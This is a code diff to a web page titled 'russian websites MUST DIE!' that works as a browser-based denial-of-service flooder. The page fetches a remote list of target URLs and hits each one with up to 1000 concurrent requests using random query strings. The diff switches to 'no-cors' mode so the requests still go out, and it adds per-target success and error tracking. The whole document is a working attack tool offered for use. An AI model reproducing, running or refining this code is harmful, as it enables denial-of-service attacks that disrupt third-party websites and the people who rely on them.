@@ -1,3 +1,5 @@
+<!DOCTYPE html>
+
 <head>
     <meta charset="utf-8" />
     <title>russian websites MUST DIE!</title>
@@ -47,18 +49,39 @@
     <script>
         let targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/targets.txt';
 
+        const updateInterval = 500;
+        const fetchTimeout = 1000;
+        const CONCURRENCY_LIMIT = 1000;
+
+        const fetchHeaders = {
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'POST, PUT, DELETE, GET, OPTIONS',
+            'Access-Control-Request-Method': '*',
+            'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization',
+        }
+
         var targetStats = {}
 
         var statsEl = document.getElementById('stats');
         function printStats() {
+            for (var [target, stats] of Object.entries(targetStats)) {
+                stats.last_responses = stats.last_responses.slice(-40)
+            }
             var table_body = Object.entries(targetStats).map(
-                ([target, { number_of_requests, number_of_errored_responses }]) => '<tr style="background-color:' + (number_of_requests == number_of_errored_responses ? '#FF0000' : '#00FF00') + '"><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>'
+                ([target, { number_of_requests, number_of_errored_responses, last_responses, last_error }]) => 
+                '<tr style="background-color:' + 
+                    (last_responses.includes('!') ? '#FF0000' : last_responses.includes('+') ? '#00FF00' : '#FFFF00') + 
+                '"><td>' + target + 
+                '</td><td>' + number_of_requests + 
+                '</td><td>' + number_of_errored_responses + 
+                '</td><td>' + last_responses + 
+                '</td><td>' + last_error + 
+                '</td></tr>'
             ).join('')
-            statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + table_body + '</tbody></table>'
+            statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th><th>Last Error</th></tr></thead><tbody>' + table_body + '</tbody></table>'
         }
-        setInterval(printStats, 1000);
+        setInterval(printStats, updateInterval);
 
-        var CONCURRENCY_LIMIT = 1000
         var queue = []
 
         async function fetchWithTimeout(resource, options) {
@@ -66,7 +89,8 @@
             const id = setTimeout(() => controller.abort(), options.timeout);
             return fetch(resource, {
                 method: 'GET',
-                mode: 'cors',
+                mode: 'no-cors',
+                // headers: fetchHeaders,
                 signal: controller.signal
             }).then((response) => {
                 clearTimeout(id);
@@ -84,20 +108,31 @@
                 }
                 rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
                 queue.push(
-                    fetchWithTimeout(target + rand, { timeout: 1000 })
+                    fetchWithTimeout(target + rand, { timeout: fetchTimeout })
                         .catch((error) => {
                             if (error.code === 20 /* ABORT */) {
                                 return;
                             }
                             targetStats[target].number_of_errored_responses++;
+                            targetStats[target].last_responses += '!';
+                            targetStats[target].last_error = error.message;
                         })
                         .then((response) => {
-                            if (response && !response.ok) {
-                                targetStats[target].number_of_errored_responses++;
+                            if (response) {
+                                if (!response.ok) {
+                                    targetStats[target].number_of_errored_responses++;
+                                    targetStats[target].last_responses += "~";
+                                }
+                                else {
+                                    targetStats[target].last_responses += "+";
+                                }
                             }
+                            else { 
+                                targetStats[target].last_responses += "-";
+                            }
+
                             targetStats[target].number_of_requests++;
                         })
-
                 )
             }
         }
@@ -106,7 +141,12 @@
             r.text().then((d) => {
                 let targets = d.split('\n');
                 targets.forEach((target) => {
-                    targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+                    targetStats[target] = {
+                        number_of_requests: 0,
+                        number_of_errored_responses: 0,
+                        last_responses: [],
+                        last_error: ""
+                    }
                 })
                 targets.map(flood)
             })
